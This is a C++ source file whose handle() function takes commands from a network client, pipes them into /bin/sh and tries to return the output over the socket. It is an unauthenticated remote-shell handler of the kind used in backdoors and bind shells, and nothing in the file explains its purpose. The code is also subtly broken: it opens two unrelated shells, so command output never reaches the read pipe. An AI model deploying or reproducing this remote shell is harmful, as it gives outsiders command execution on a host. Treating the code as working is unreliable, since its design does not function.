#include "../include/handler.h"
#include <iostream>
#include <unistd.h>
#include <fcntl.h>
#include <cstring>
#include <sys/socket.h>
#include <cstdio>
#include <cstdlib>
#include <cerrno>

#define BUFFER_SIZE 1024

void handle(int client_socket) {
    char buffer[BUFFER_SIZE];
    FILE *shell;
    FILE *shell_read;

    // Open a pipe to /bin/sh in write mode
    shell = popen("/bin/sh", "w");
    if (shell == NULL) {
        std::cerr << "popen() failed: " << strerror(errno) << std::endl;
        close(client_socket);
        return;
    }

    // Open a pipe to /bin/sh in read mode
    shell_read = popen("/bin/sh", "r");
    if (shell_read == NULL) {
        std::cerr << "popen() failed: " << strerror(errno) << std::endl;
        pclose(shell);
        close(client_socket);
        return;
    }

    // Set the read end of the pipe to non-blocking
    fcntl(fileno(shell_read), F_SETFL, O_NONBLOCK);

    while (true) {
        // Read command from the client socket
        ssize_t nbytes = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
        if (nbytes <= 0) {
            std::cerr << "Client disconnected or error occurred" << std::endl;
            break; // Exit loop if client disconnects or error occurs
        }
        buffer[nbytes] = '\0'; // Null-terminate the buffer
        std::cout << "Received command: " << buffer << std::endl;

        if (strcmp(buffer, "exit") == 0) {
            break;
        }

        // Write the command to the shell
        fprintf(shell, "%s\n", buffer);
        fflush(shell);

        // Read the command output from the pipe
        while ((nbytes = read(fileno(shell_read), buffer, sizeof(buffer) - 1)) > 0) {
            buffer[nbytes] = '\0'; // Null-terminate the buffer
            send(client_socket, buffer, nbytes, 0); // Send the output back to the client
        }
    }

    // Close the pipes
    pclose(shell);
    pclose(shell_read);
    close(client_socket);
}
